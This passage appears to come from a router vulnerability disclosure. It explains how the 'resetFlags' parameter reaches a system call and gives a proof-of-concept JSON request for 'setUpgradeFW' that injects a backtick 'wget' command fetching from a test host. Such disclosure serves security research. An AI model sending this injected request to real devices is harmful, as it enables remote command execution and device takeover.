...
In sub_42356C function, it reads in a user-provided parameter `resetFlags` .

<div  align="center"><img src="./img/lib.png" style="zoom:80%;" /></div>

However ,the value of the `resetFlags`  is inserted into `v4`  using `snprintf`,and the value of v11 will be handled by the function CsteSystem.
...
We set `resetFlags` as **\`wget 192.168.6.1:7777/testpoc\`** , and the router will execute it,such as:
...
{"topicurl":"setUpgradeFW","resetFlags":"`wget 192.168.6.1:7777/testpoc`"
}
```
